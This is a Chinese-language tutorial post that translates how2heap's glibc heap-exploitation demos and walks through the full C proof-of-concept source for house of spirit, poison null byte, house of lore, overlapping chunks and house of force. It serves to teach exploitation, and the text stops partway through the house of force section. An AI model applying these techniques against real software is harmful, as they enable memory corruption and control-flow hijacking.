# 【技术分享】how2heap总结-下

阅读量 **233859**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-09-11 10:30:50

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

作者：[7o8v_](http://bobao.360.cn/member/contribute?uid=2556795459)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**0x00 前言**

****

"how2heap"是shellphish团队在Github上开源的 **堆漏洞** 系列教程.
我这段时间一直在学习堆漏洞利用方面的知识,看了这些利用技巧以后感觉受益匪浅.
这篇文章是我学习这个系列教程后的总结,在此和大家分享.我会尽量翻译原版教程的内容,方便英语不太好的同学学习.
不过在学习这些技巧之前,建议大家去看一看华庭写的"Glibc内存管理-Ptmalloc2源码分析"

<http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf>

在此也给出原版教程链接:

<https://github.com/shellphish/how2heap>

**补充**

****

上篇的总结因为在微信公众号发过了，所以不在这里发，可以到我的博客去看。博客：[reversing.win](http://reversing.win)

这次的翻译部分我决定再随性一点，每一句尽量使用我自己的理解。

而且原文有些错误的地方或者表意不明的地方我会在翻译部分修正，要是原文看不太明白，可以看我的翻译。

然后就是输出部分我就不贴了，大家想要学习的就自己在机器上输出看看。 😛

**0x01 测试环境**

****

Ubuntu 16.04.3 LTS x64

GLIBC 2.23

  

**0x02 目录**

****

house_of_spirit

poison_null_byte

house_of_lore

overlapping_chunks

overlapping_chunks_2

house_of_force

unsoted_bin_attack

  

**0x03 house_of_spirit**

****

源码：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main()
    {
       printf("This file demonstrates the house of spirit attack.n");
       printf("Calling malloc() once so that it sets up its memory.n");
       malloc(1);
       printf("We will now overwrite a pointer to point to a fake 'fastbin' region.n");
       unsigned long long *a;
       // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
       unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
       printf("This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);
       printf("This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64)." 
            "The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n");
       printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. "
            "E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n");
       fake_chunks[1] = 0x40; // this is the size
       printf("The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) "
            "to pass the nextsize integrity checks. No need for fastbin size.n");
       // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
       fake_chunks[9] = 0x1234; // nextsize
       printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n", &fake_chunks[1]);
       printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n");
       a = &fake_chunks[2];
       printf("Freeing the overwritten pointer.n");
       free(a);
       printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!n", &fake_chunks[1], &fake_chunks[2]);
       printf("malloc(0x30): %pn", malloc(0x30));
    }

**翻译：**

这个程序展示了一种被称为 **house_of_spirit** 的攻击方式。

首先调用一次 **malloc** 来初始化内存布局。

我们将会修改一个指针去指向一个 **fake fastbin** 区域。

    
    
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

这个区域长度为0x50，里面包含了两个chunk。第一个chunk开始于 **fake_chunk[0]** ,第二个chunk开始于
**fake_chunk[8]** 。

第一个chunk的size要在fastbin的范围内（x64机器上是 < 0x80），同时注意实际大小比可用大小多两个单元。

因为这个chunk被我们伪装成了fastbin，所以 **PREV_INUSE** 是什么都无所谓（free的时候不会管这个标志位），但是
**IS_MMAPPED** 和 **NON_MAIN_ARENA** 两个标志位是会有影响的，确保为0就行。

还有需要注意的是，我们用 **malloc**
申请内存的时候，表示内存大小的参数最后是会因为对齐的操作，使得我们输入不同的参数可能都会返回同样大小的内存，比如在x64的机器上我们申请
**0x30~0x38** 大小的内存，最后都会返回给我们 **0x40**
大小的内存。所以，如果我们想要一个0x40大小的内存，上面表示的大小范围内的值都可以作为malloc的参数。

还有就是第二个fake chunk的size必须要大于 **2*size_t** （x64机器上是16字节），且必须小于main
arena的大小，一般来讲是128kb，以此来pass掉chunk是否正常的检查。

然后我们将要free的指针的值改为fake chunk的地址 **fake_chunk[2]**

还有一点比较重要，fake chunk的地址必须是16字节对齐（x86机器上是8字节对齐）。

由于我们的fake chunk伪造的size值为0x40,所以之后malloc(0x30~0x38)都会返回 **fake_chunk[2]** 的地址。

**需要注意的是，这个示例中的fake chunk是布置在栈上的。**

这里我画一张图来帮助理解:

构造fake_chunk_1的目的是我们最后要返回它的指针来控制这片区域；而构造fake_chunk_2的目的是为了pass掉free()的检查使得我们可以成功返回fake_chunk_1的指针。
free之后的效果是这样的：

栈地址被成功放到了fastbin的链表上，之后就能把它malloc出来了。

当我们伪造的fake chunk内部存在不可控区域的时候，运用这个技术就可以将这片区域变成可控的了。

关于这个技术如果要练手的话，可以去做一下 pwnable.tw 上的 spirited_away
这道题。(后续我会将解题思路放到我的博客，可能不会放wp。)

**0x04 poison_null_byte**

****

源码：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    #include <malloc.h>
    
    
    int main()
    {
            printf("Welcome to poison null byte 2.0!n");
            printf("Tested in Ubuntu 14.04 64bit.n");
        printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.n");
    
        uint8_t* a;
        uint8_t* b;
        uint8_t* c;
        uint8_t* b1;
        uint8_t* b2;
        uint8_t* d;
    
        printf("We allocate 0x100 bytes for 'a'.n");
        a = (uint8_t*) malloc(0x100);
        printf("a: %pn", a);
        int real_a_size = malloc_usable_size(a);
        printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' "
            "(it may be more than 0x100 because of rounding): %#xn", real_a_size);
        /* chunk size attribute cannot have a least significant byte with a value of 0x00.
         * the least significant byte of this will be 0x10, because the size of the chunk includes
         * the amount requested plus some amount required for the metadata. */
        b = (uint8_t*) malloc(0x200);
    
        printf("b: %pn", b);
    
        c = (uint8_t*) malloc(0x100);
        printf("c: %pn", c);
    
        uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    
        // added fix for size==prev_size(next_chunk) check in newer versions of glibc
        // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
        // this added check requires we are allowed to have null pointers in b (not just a c string)
        //*(size_t*)(b+0x1f0) = 0x200;
        printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
            "the check 'chunksize(P) != prev_size (next_chunk(P))'n");
        // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
        // which is the value of b.size after its first byte has been overwritten with a NULL byte
        *(size_t*)(b+0x1f0) = 0x200;
    
        // this technique works by overwriting the size metadata of a free chunk
        free(b);
    
        printf("b.size: %#lxn", *b_size_ptr);
        printf("b.size is: (0x200 + 0x10) | prev_in_usen");
        printf("We overflow 'a' with a single null byte into the metadata of 'b'n");
        a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
        printf("b.size: %#lxn", *b_size_ptr);
    
        uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
        printf("c.prev_size is %#lxn",*c_prev_size_ptr);
        // This malloc will result in a call to unlink on the chunk where b was.
        // The added check (commit id: 17f487b), if not properly handled as we did before,
        // will detect the heap corruption now.
        // The check is this: chunksize(P) != prev_size (next_chunk(P)) where
        // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
        // next_chunk(P) == b-0x10+0x200 == b+0x1f0
        // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
        printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))n",
            *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
        b1 = malloc(0x100);
    
        printf("b1: %pn",b1);
        printf("Now we malloc 'b1'. It will be placed where 'b' was. "
            "At this point c.prev_size should have been updated, but it was not: %lxn",*c_prev_size_ptr);
        printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
            "before c.prev_size: %lxn",*(((uint64_t*)c)-4));
        printf("We malloc 'b2', our 'victim' chunk.n");
        // Typically b2 (the victim) will be a structure with valuable pointers that we want to control
    
        b2 = malloc(0x80);
        printf("b2: %pn",b2);
    
        memset(b2,'B',0x80);
        printf("Current b2 content:n%sn",b2);
    
        printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').n");
    
        free(b1);
        free(c);
        printf("Finally, we allocate 'd', overlapping 'b2'.n");
        d = malloc(0x300);
        printf("d: %pn",d);
    
        printf("Now 'd' and 'b2' overlap.n");
        memset(d,'D',0x300);
        printf("New b2 content:n%sn",b2);
    
        printf("Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf "
            "for the clear explanation of this technique.n");
    }

**翻译：**

这个技术可被用于当可以被malloc的区域（也就是heap区域）存在一个单字节溢出漏洞的时候。

我们先分配0x100个字节的内存，代号'a'。

如果我们想要去溢出a的话，我们需要知道它的实际大小（因为空间复用的存在），在我的机器上是0x108。

然后接着我们分配0x200个字节，代号'b'。

再分配0x100个字节，代号'c'。

    
    
    uint8_t* a = malloc(0x100);
    uint8_t* b = malloc(0x200);
    uint8_t* c = malloc(0x100);

那么我们现在就有三个内存块：

    
    
    a: 0x100
    b: 0x200
    c: 0x100

在新版glibc环境下，我们需要在b内部更新size来pass **'chunksize(P) != prev_size
(next_chunk(P))'**

    
    
    *(size_t*)(b+0x1f0) = 0x200;
    free(b)

b.size: 0x211 == ((0x200 + 0x10) | pre_in_use)

我们在a实现一个单字节的 null byte 溢出。

之后 b.size = 0x200

此时c.presize = 0x210 但是没关系我们还是能pass掉前面那个check。

这个时候：

    
    
    b1 = malloc(0x100);

返回给b1的地址就是前面free掉的b的地址。

有趣的是现在C的presize在原来地址的后面两个单元位置处更新。 OK，我们再malloc一块内存。

    
    
    b2 = malloc(0x80);

此时刚才的presize依然会更新，而且b2整个块也仍然在原来b的内部。

之后我们将b1和c依次free。这会导致b1开始的位置一直到c的末尾中间的内存会合并成一块。

    
    
    free(b1);
    free(c);
    d = malloc(0x300);

返回的地址还是原来b的地址，重要的是刚才没有free的b2被包含在了里面！

我想这里的难点在于明白为什么后面的合并会发生。

还记得，在我们第一次free(b)之前，进行了如下的设置：

    
    
    *(size_t*)(b+0x1f0) = 0x200;

这一步非常关键，可以确保我们之后进行null byte溢出后，还能成功free(b)。

这和上一个例程house_of_spirit对fake_chunk_2进行的设置的道理是一样的，逃过 **'chunksize(P) !=
prev_size (next_chunk(P))'** 的检查。

之后分配b1和b2的时候，presize也会一直在(b+0x1f0)处更新。

而在最后free(c)的时候，检查的是c的presize位，而因为最开始的null byte溢出，导致这块区域的值一直没被更新，一直是b最开始的大小
0x210 。

而在free的过程中就会认为前面0x210个字节都是空闲的，于是就错误地进行了合并，然而glibc忽略了中间还有个可怜的b2。

更详细的讲解可以参考这篇paper

<http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf>

**0x05 house_of_lore**

****

【注】：源码我改动过，使其编译为64位可执行文件仍能正常运行。其实不改的话也能正常运行，不过改了之后看得更直观。

**源码**

    
    
    /*
    Advanced exploitation of the House of Lore - Malloc Maleficarum.
    This PoC take care also of the glibc hardening of smallbin corruption.
    [ ... ]
    else
    {
      bck = victim->bk;
      if (__glibc_unlikely (bck->fd != victim)){
         errstr = "malloc(): smallbin double linked list corrupted";
         goto errout;
      }
      set_inuse_bit_at_offset (victim, nb);
      bin->bk = bck;
      bck->fd = bin;
      [ ... ]
    */
    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    void jackpot(){ puts("Nice jump d00d"); exit(0); }
    int main(int argc, char * argv[]){
      intptr_t* stack_buffer_1[4] = {0};
      intptr_t* stack_buffer_2[3] = {0};
      printf("nWelcome to the House of Loren");
      printf("This is a revisited version that bypass also the hardening check introduced by glibc mallocn");
      printf("This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23nn");
      printf("Allocating the victim chunkn");
      intptr_t *victim = malloc(0x80);
      printf("Allocated the first small chunk on the heap at %pn", victim);
      // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
      intptr_t *victim_chunk = victim-2;
      printf("stack_buffer_1 at %p stack_buffer_1[1] at %pn", (void*)stack_buffer_1,(void*)&stack_buffer_1[1]);
      printf("stack_buffer_2 at %p stack_buffer_2[1] at %pn", (void*)stack_buffer_2,(void*)&stack_buffer_2[1]);
      printf("Create a fake chunk on the stackn");
      printf("Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted "
             "in second to the last malloc, which putting stack address on smallbin listn");
      stack_buffer_1[2] = victim_chunk;
      printf("Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
             "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
             "chunk on stackn");
      stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
      stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
    
      printf("Allocating another large chunk in order to avoid consolidating the top chunk with "
             "the small one during the free()n");
      void *p5 = malloc(1000);
      printf("Allocated the large chunk on the heap at %pn", p5);
    
    
      printf("Freeing the chunk %p, it will be inserted in the unsorted binn", victim);
      free((void*)victim);
    
      printf("nIn the unsorted bin the victim's fwd and bk pointers are niln");
      printf("victim->fwd: %pn", (void *)victim[0]);
      printf("victim->bk: %pnn", (void *)victim[1]);
    
      printf("Now performing a malloc that can't be handled by the UnsortedBin, nor the small binn");
      printf("This means that the chunk %p will be inserted in front of the SmallBinn", victim);
    
      void *p2 = malloc(1200);
      printf("The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %pn", p2);
    
      printf("The victim chunk has been sorted and its fwd and bk pointers updatedn");
      printf("victim->fwd: %pn", (void *)victim[0]);
      printf("victim->bk: %pnn", (void *)victim[1]);
      //------------VULNERABILITY-----------    
      printf("Now emulating a vulnerability that can overwrite the victim->bk pointern");
    
      victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
    
      //------------------------------------    
      printf("Now allocating a chunk with size equal to the first one freedn");
      printf("This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointern");
    
      void *p3 = malloc(0x80);
      printf("p3 = %pn",p3 );
    
      printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bkn");
      char *p4 = malloc(0x80);
      printf("p4 = malloc(0x80)n");
      printf("nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %pn",
             stack_buffer_2[2]);
      printf("np4 is %p and should be on the stack!n", p4); // this chunk will be allocated on stack
      intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
      memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
    }

**翻译**

在栈上有分配两个数组如下

    
    
    intptr_t* stack_buffer_1[4] = {0};  
    intptr_t* stack_buffer_2[3] = {0};

分配好victim chunk

    
    
    victim = malloc(0x80)
    intptr_t* victim_chunk = victim-2;

这是heap上的第一个small chunk

然后在栈上制造一个fake chunk

    
    
    stack_buffer_1[2] = victim_chunk;

这里的 **stack_buffer_1[2]** 刚好是我们要构造的第一个fake_chunk的fd指针的位置。

上面的操作可以pass掉后面malloc对于smallbin的检查。

再进行下面的操作：

    
    
    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

stack_buffer_1[3]是第一个fake chunk的bk字段

和上面一样是为了pass掉malloc的检查。

然后申请一块大内存，来防止等一下free的时候把我们精心构造好的victim chunk给合并了。

    
    
    void *p5 = malloc(1000);

现在把victim chunk给free掉，之后它会被放入unsortedbin中。

放入unsortedbin之后victim chunk的fd和bk会同时指向unsortedbin的头部。

现在执行一个不能被unsortedbin和smallbin响应的malloc。

    
    
    void *p2 = malloc(1200);

malloc之后victim chunk将会从unsortedbin转移到smallbin中。

同时它的fd和bk也会更新，改为指向smallbin的头部。

现在假设发生了溢出改写了victim的bk指针

    
    
    victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

现在开始malloc和victim大小相同的内存块。

    
    
    p3 = malloc(0x80);

返回给p3地址就是原来的victim地址，而且此时前面伪造的fake chunk也被连接到了smallbin上。

再次malloc

    
    
    p4 = malloc(0x80);

这次返回的p4就将是一个栈地址！

这个技术最重要的地方在于成功将victim chunk和两个fake chunk构造成双向链表。

还是给个示意图：

这就是布局好的双向链表。

可以看到 **stack_buffer_2** 的bk字段是空着的，那是因为我们这时没有进行信息的泄露，如果泄露出 **smallbin_head**
的值并填上去的话，这个链表才算是完整，当然如果没必要的话可以不这样做。尽管之后的针对这个smallbin的malloc会报错。

在前面我补充说过：

    
    
    【注】：源码我改动过，使其编译为64位可执行文件仍能正常运行。其实不改的话也能正常运行，不过改了之后看得更直观。

**原来的代码中victim chunk的大小是100，malloc之后会对齐到0x70。**

0x70在32位系统上属于smallbin，在64位系统上属于fastbin。

原本针对32位程序的代码编译为64位程序也能正常运行，这是为什么？

这是因为，不管这个0x70大小的victim
chunk是先加入unsotedbin还是fastbin，在之后都会被加入到smallbin中，smallbin也有0x70大小的链表！

可以看下图，这时victim chunk被加入fastbin链表的时候：

在经过 **void *p2 = malloc(1200);** 后：

而在我改过代码之后，victim chunk就是正常地先加入unsortedbin再加入smallbin了。

**0x06 overlapping_chunks**

****

**源码：**

    
    
    /*
     A simple tale of overlapping chunk.
     This technique is taken from
     http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf
    */
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    int main(int argc , char* argv[]){
      intptr_t *p1,*p2,*p3,*p4;
      printf("nThis is a simple chunks overlapping problemnn");
      printf("Let's start to allocate 3 chunks on the heapn");
      p1 = malloc(0x100 - 8);
      p2 = malloc(0x100 - 8);
      p3 = malloc(0x80 - 8);
      printf("The 3 chunks have been allocated here:np1=%pnp2=%pnp3=%pn", p1, p2, p3);
      memset(p1, '1', 0x100 - 8);
      memset(p2, '2', 0x100 - 8);
      memset(p3, '3', 0x80 - 8);
      printf("nNow let's free the chunk p2n");
      free(p2);
      printf("The chunk p2 is now in the unsorted bin ready to serve possiblennew malloc() of its sizen");
    
      printf("Now let's simulate an overflow that can overwrite the size of the chunk freed p2.n");
      printf("For a toy program, the value of the last 3 bits is unimportant;"
            " however, it is best to maintain the stability of the heap.n");
      printf("To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
            " to assure that p1 is not mistaken for a free chunk.n");
    
      int evil_chunk_size = 0x181;
      int evil_region_size = 0x180 - 8;
      printf("We are going to set the size of chunk p2 to to %d, which gives usna region size of %dn",
             evil_chunk_size, evil_region_size);
    
      *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
    
      printf("nNow let's allocate another chunk with a size equal to the datan"
               "size of the chunk p2 injected sizen");
      printf("This malloc will be served from the previously freed chunk thatn"
               "is parked in the unsorted bin which size has been modified by usn");
      p4 = malloc(evil_region_size);
      printf("np4 has been allocated at %p and ends at %pn", p4, p4+evil_region_size);
      printf("p3 starts at %p and ends at %pn", p3, p3+80);
      printf("p4 should overlap with p3, in this case p4 includes all p3.n");
    
      printf("nNow everything copied inside chunk p4 can overwrites data onnchunk p3,"
            " and data written to chunk p3 can overwrite datanstored in the p4 chunk.nn");
    
      printf("Let's run through an example. Right now, we have:n");
      printf("p4 = %sn", (char *)p4);
      printf("p3 = %sn", (char *)p3);
    
      printf("nIf we memset(p4, '4', %d), we have:n", evil_region_size);
      memset(p4, '4', evil_region_size);
      printf("p4 = %sn", (char *)p4);
      printf("p3 = %sn", (char *)p3);
    
      printf("nAnd if we then memset(p3, '3', 80), we have:n");
      memset(p3, '3', 80);
      printf("p4 = %sn", (char *)p4);
      printf("p3 = %sn", (char *)p3);
    }

**翻译：**

这是一个简单的堆块重叠的问题。

先malloc三个堆块：

    
    
    p1 = malloc(0x100 - 8);
    p2 = malloc(0x100 - 8);
    p3 = malloc(0x80 - 8);

现在free掉p2

p2被free之后加入到了unsortedbin链表中待命

现在让我们模拟一个可以改写p2.size的溢出。

    
    
    int evil_chunk_size = 0x181;
    *(p2-1) = evil_chunk_size;

对于我们这个例子来讲三个标志位影响不是很大，但是为了保持堆的稳定性，还是不要随意改动。

至少我们要确保pre_in_use为true，不要让p1被误认为被free了。

我们将p2的size改写为0x181，之后的malloc就会返回给我们一个0x178（可使用大小）的堆块。

…

下面的就不再翻译了，大概意思就是malloc(0x178)返回了p2的地址，而且包含了整个p3在里面。

    
    
    int evil_region_size = 0x180 - 8;
    p4 = malloc(evil_region_size);

返回给p4的地址就是原来p2的，而且p4中包含了还没被free的p3。

我们前面通过溢出一个null byte来达到overlapping chunk的效果。

这里就非常简单暴力了，直接修改已经free的chunk的size字段，而且只用修改这个字段，就可以达到攻击的目的了。

之后的malloc就可以返回一个带有overlapping效果的chunk。

没太多可讲的，整个过程也比较简单。

**0x07 overlapping_chunks_2**

****

**源码：**

    
    
    /*
     Yet another simple tale of overlapping chunk.
     This technique is taken from
     https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.
     This is also referenced as Nonadjacent Free Chunk Consolidation Attack.
    */
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    #include <malloc.h>
    int main(){
      intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
      unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
      int prev_in_use = 0x1;
      printf("nThis is a simple chunks overlapping problem");
      printf("nThis is also referenced as Nonadjacent Free Chunk Consolidation Attackn");
      printf("nLet's start to allocate 5 chunks on the heap:");
      p1 = malloc(1000);
      p2 = malloc(1000);
      p3 = malloc(1000);
      p4 = malloc(1000);
      p5 = malloc(1000);
      real_size_p1 = malloc_usable_size(p1);
      real_size_p2 = malloc_usable_size(p2);
      real_size_p3 = malloc_usable_size(p3);
      real_size_p4 = malloc_usable_size(p4);
      real_size_p5 = malloc_usable_size(p5);
    
      printf("nnchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
      printf("nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
      printf("nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
      printf("nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
      printf("nchunk p5 from %p to %pn", p5,  (unsigned char *)p5+malloc_usable_size(p5));
    
      memset(p1,'A',real_size_p1);
      memset(p2,'B',real_size_p2);
      memset(p3,'C',real_size_p3);
      memset(p4,'D',real_size_p4);
      memset(p5,'E',real_size_p5);
     
      printf("nLet's free the chunk p4.nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4n"); 
    
      free(p4);
    
      printf("nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2nwith the size of chunk_p2 + size of chunk_p3n");
    
      *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 
    
      printf("nNow during the free() operation on p2, the allocator is fooled to think that nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) n");
      printf("nThis operation will basically create a big free chunk that wrongly includes p3n");
      free(p2);
      printf("nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunkn");
    
      p6 = malloc(2000);
      real_size_p6 = malloc_usable_size(p6);
    
      printf("nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and nwe can overwrite data in p3 by writing on chunk p6n");
      printf("nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);
      printf("nchunk p3 from %p to %pn", p3, (unsigned char *) p3+real_size_p3); 
    
      printf("nData inside chunk p3: nn");
      printf("%sn",(char *)p3); 
    
      printf("nLet's write something inside p6n");
      memset(p6,'F',1500);  
    
      printf("nData inside chunk p3: nn");
      printf("%sn",(char *)p3); 
    
    }

**翻译：**

这同样是一个简单的堆块重叠的问题。

这也被称为非相邻free chunk合并攻击。

首先malloc五个堆块：

    
    
    p1 = malloc(1000);
    p2 = malloc(1000);
    p3 = malloc(1000);
    p4 = malloc(1000);
    p5 = malloc(1000);
    free(p4);

因为p5的存在所以p4不会被合并。

然后我们在p1触发一个溢出，将p2的size改写成p2和p3大小的和。

之后free(p2)的时候，分配器就会认为p4是下一个块（忽略p3）。

然后就会错误地将p3和p2合并。

    
    
    p6 = malloc(2000);

这时返回给p6的地址就是p2的地址了，p6内部也包含了未被free的p3。

我们可以愉快地通过p6来改写p3中的任何数据。

这个例程介绍的是获得overlapping chunk的另外一种方法。

上面那种方法是在chunk已经被free的情况下直接修改size字段，然后将chunk malloc出来。

这个例程是在chunk被free之前，通过修改size，然后free，欺骗free函数去修改了下一个chunk的presize字段来强行“合并”堆块。

这里就是设置了p2的size为p2和p3大小的和，之后更新presize的时候是通过p2的地址加上p2的size来寻找的要修改的位置的，这里刚好就把p4头部的presize给改掉了。

之后的malloc也顺理成章地将p2和p3作为一块内存分配给我们了，尽管p3没有被free。

**0x08 house_of_force**

****

**源码：**

    
    
    /*
       This PoC works also with ASLR enabled.
       It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
       If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
       ( http://phrack.org/issues/66/10.html )
       Tested in Ubuntu 14.04, 64bit.
    */
    #include <stdio.h>
    #include <stdint.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    #include <malloc.h>
    char bss_var[] = "This is a string that we want to overwrite.";
    int main(int argc , char* argv[])
    {
      printf("nWelcome to the House of Forcenn");
      printf("The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.n");
      printf("The top chunk is a special chunk. Is the last in memory "
          "and is the chunk that will be resized when malloc asks for more space from the os.n");
      printf("nIn the end, we will use this to overwrite a variable at %p.n", bss_var);
      printf("Its current value is: %sn", bss_var);
      printf("nLet's allocate the first chunk, taking space from the wilderness.n");
      intptr_t *p1 = malloc(256);
      printf("The chunk of 256 bytes has been allocated at %p.n", p1);
    
      printf("nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.n");
      int real_size = malloc_usable_size(p1);
      printf("Real size (aligned and all that jazz) of our allocated chunk is %d.n", real_size);
    
      printf("nNow let's emulate a vulnerability that can overwrite the header of the Top Chunkn");
    
      //----- VULNERABILITY ----      intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
      printf("nThe top chunk starts at %pn", ptr_top);
    
      printf("nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.n");
       printf("Old size of top chunk %#llxn", *((unsigned long long int *)ptr_top));
      ptr_top[0] = -1;
      printf("New size of top chunk %#llxn", *((unsigned long long int *)ptr_top));
        //------------------------    
      printf("nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.n"
           "Next, we will allocate a chunk that will get us right up against the desired region (with an integer "
           "overflow) and will then be able to allocate a chunk right over the desired region.n");
    
      unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
      printf("nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,n"
           "we will malloc %#lx bytes.n", bss_var, ptr_top, evil_size);
      void *new_ptr = malloc(evil_size);
      printf("As expected, the new pointer is at the same place as the old top chunk: %pn", new_ptr);
    
      void* ctr_chunk = malloc(100);
      printf("nNow, the next chunk we overwrite will point at our target buffer.n");
      printf("malloc(100) => %p!n", ctr_chunk);
      printf("Now, we can finally overwrite that value:n");
    
      printf("... old string: %sn", bss_var);
      printf("... doing strcpy overwrite with "YEAH!!!"...n");
      strcpy(ctr_chunk, "YEAH!!!");
      printf("... new string: %sn", bss_var);
    
    
      // some further discussion:
      //printf("This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessednn");
      //printf("This because the main_arena->top pointer is setted to current av->top + malloc_size "
      //    "and we nwant to set this result to the address of malloc_got_address-8nn");
      //printf("In order to do this we have malloc_got_address-8 = p2_guessed + evil_sizenn");
      //printf("The av->top after this big malloc will be setted in this way to malloc_got_address-8nn");
      //printf("After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
      //    "nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_addressnn");
    
      //printf("The large chunk with evil_size has been allocated here 0x%08xn",p2);
      //printf("The main_arena value av->top has been setted to malloc_got_address-8=0x%08xn",malloc_got_address);
    
      //printf("This last malloc will be served from the remainder code and will return the av->top+8 injected beforen");
    }

**翻译：**

**house_of_force** 的主要思想是，通过改写top chunk来使malloc返回任意地址。

top chunk是一块非常特殊的内存，它存在于堆区的最后，而且一般情况下，当malloc向os申请内存时，top chunk的大小会变动。

我们就利用这个机制来改写一个变量

    
    
    char bss_var[]= "This is a string that we want to overwrite.";

先分配第一个chunk：

    
    
    intptr_t *p1 = malloc(256);

